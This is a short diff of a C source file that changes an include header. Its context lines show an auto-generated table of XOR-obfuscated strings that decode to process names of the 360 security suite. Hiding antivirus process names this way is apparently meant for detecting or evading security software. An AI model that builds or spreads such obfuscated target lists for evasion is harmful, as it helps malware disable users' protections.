@@ -1,4 +1,4 @@
-#include "process.h"
+#include "common.h"
 // --- Auto-generated Encrypted Process Names ---
 const unsigned char data_0[] = { 0x71, 0x74, 0x72, 0x23, 0x2b, 0x2c, 0x6c, 0x27, 0x3a, 0x27 }; // 360ain.exe
 const unsigned char data_1[] = { 0x71, 0x74, 0x72, 0x26, 0x37, 0x2f, 0x32, 0x6c, 0x27, 0x3a, 0x27 }; // 360dump.exe
@@ -194,4 +194,3 @@ struct EncryptedString processData[] = {
 };
 
 const size_t PROCESS_DATA_COUNT = sizeof(processData) / sizeof(processData[0]);
-
